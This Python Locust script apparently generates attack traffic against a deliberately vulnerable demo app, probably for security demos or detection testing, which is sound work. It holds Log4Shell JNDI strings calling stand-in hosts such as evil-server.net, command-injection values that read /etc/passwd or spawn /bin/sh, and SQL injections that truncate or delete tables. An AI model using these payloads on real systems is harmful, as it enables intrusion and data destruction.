#
# Copyright 2023 Dynatrace LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

import os
import random
import time
from locust import HttpUser, task, between

USER_INDEX = 0

JNDI_URIS = [
    "${jndi:ldap://cdb16160-beae-4ddd-b3d6-6b25b360f51b.dns.log4shell.tools:12345/cdb16160-beae-4ddd-b3d6-6b25b360f51b}",
    "${jndi:ldap://attacker-server.net:6789/ExploitPayload}",
    "${jndi:ldap://attacker-server.net:5555/Expoit}",
    "${jndi:ldap://evil-server.net:999/CompromiseMachine}",
    "${jndi:ldap://evil-server.net:1111/MineBitcoin}",
    "${jndi:ldap://malicious-server.net:1221/X}"
]

CMDS = [
    "example.com && whoami #",
    "image.com ; /bin/sh echo bar",
    "example-image.net ; `cat /etc/passwd`",
    "; `cat /etc/passwd`",
    "some-nice-pic.net && pwd"
]

SQL_CMDS_BIO = [
    "' WHERE 1 = 0; UPDATE bio SET bio_text = 'hacked' WHERE 1 = 1; --",
    "' WHERE 1 = 0; TRUNCATE TABLE bio; --",
    "' WHERE 1 = 0; INSERT INTO bio (user_id, bio_text) VALUES (500, 'injected'); --",
    "' WHERE 1 = 0; DELETE FROM bio WHERE user_id >= 0; --"
]

SQL_CMDS_MEMBERSHIP = [
    'HACKEDPRO") ON DUPLICATE KEY UPDATE membership="HACKEDPRO"; UPDATE membership SET membership = "hacked" '
    'WHERE 1 = 1 -- ',
    'HACKEDPRO") ON DUPLICATE KEY UPDATE membership="HACKEDPRO"; TRUNCATE TABLE membership; -- ',
]

WAIT_TIME = int(os.environ['WAIT_TIME'])

class UnguardUser(HttpUser):
    wait_time = between(WAIT_TIME, WAIT_TIME + 20)

    def get_running_username(self):
        global USER_INDEX
        USER_INDEX += 1
        return "hacker_" + str(USER_INDEX)

    @task()
    def post_jndi(self):
        jndi_post = {'header': "en-US",
                    'urlmessage': random.choice(JNDI_URIS)}

        self.client.post("/post", data=jndi_post)
        time.sleep(1)

    @task()
    def post_cmd(self):
        cmd_post = {'imgurl': random.choice(CMDS)}

        self.client.post("/post", data=cmd_post)
        time.sleep(1)

    @task()
    def post_sql_java(self):
        sql_bio = {'bioText': random.choice(SQL_CMDS_BIO)}

        # post a bio to make sure a bio for this user exists already and an UPDATE statement is used on the server side
        self.client.post("/bio/" + self.get_running_username(), data={'bioText': ''})

        # post the malicious SQL command
        self.client.post("/bio/" + self.get_running_username(), data=sql_bio)
        time.sleep(1)

    @task()
    def post_sql_dotnet(self):
        sql_membership = {'membershipText': random.choice(SQL_CMDS_MEMBERSHIP)}

        # post the malicious SQL command
        self.client.post("/membership/" + self.get_running_username(), data=sql_membership)
        time.sleep(1)

    def on_start(self):
        curr_user = self.get_running_username()
        # super secure passwords :)
        user_data = {"username": curr_user, "password": curr_user}
        cookie_set = False
        while not cookie_set:
            self.client.post("/register", data=user_data)
            self.client.post("/login", data=user_data)
            cookie_set = self.client.cookies.get('jwt') is not None
            if not cookie_set:
                # wait a bit for deployments to stabilize
                # so we can retry logging in
                time.sleep(5)
